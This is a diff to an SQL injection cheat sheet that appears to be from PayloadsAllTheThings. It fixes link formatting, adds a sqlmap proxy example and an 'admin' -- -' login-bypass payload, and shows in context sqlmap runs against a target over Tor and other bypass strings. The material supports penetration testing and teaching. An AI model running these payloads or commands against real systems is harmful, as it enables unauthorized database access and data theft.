@@ -10,12 +10,12 @@ Attempting to manipulate SQL queries may have goals including:
 
 ## Summary
 
-* [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MSSQL%20Injection.md)
-* [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md)
-* [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/OracleSQL%20Injection.md)
-* [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/PostgreSQL%20Injection.md)
-* [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/SQLite%20Injection.md)
-* [CheatSheet Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/Cassandra%20Injection.md)
+* [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
+* [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
+* [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
+* [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
+* [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+* [CheatSheet Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
 * [Entry point detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
 * [SQL injection using SQLmap](#sql-injection-using-sqlmap)
@@ -169,6 +169,12 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
 ```
 
+### Using a proxy with SQLmap
+
+```powershell
+sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
+```
+
 ### Using Chrome cookie and a Proxy
 
 ```powershell
@@ -292,6 +298,7 @@ or 1=1--
 or 1=1#
 or 1=1/*
 admin' --
+admin' -- -
 admin' #
 admin'/*
 admin' or '2' LIKE '1
@@ -499,25 +506,25 @@ mysql> mysql> select version();
   * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
   * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
 * MySQL:
-  * [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-  * [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
+  * [PentestMonkey's mySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+  * [Reiners mySQL injection Filter Evasion Cheatsheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
   * [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
   * [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
 * MSSQL:
-  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
-  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet](http://evilsql.com/main/page2.php)
+  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 * ORACLE:
-  * [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+  * [PentestMonkey's Oracle SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
 * POSTGRESQL:
-  * [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
+  * [PentestMonkey's Postgres SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
 * Others
   * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-  * [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-  * [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
-  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
-  * [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
-  * [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
-  * [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
+  * [Access SQLi Cheatsheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
+  * [PentestMonkey's Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
+  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+  * [Pentestmonkey's Informix SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
+  * [SQLite3 Injection Cheat sheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
+  * [Ruby on Rails (Active Record) SQL Injection Guide](http://rails-sqli.org/)
   * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
   * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
   * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
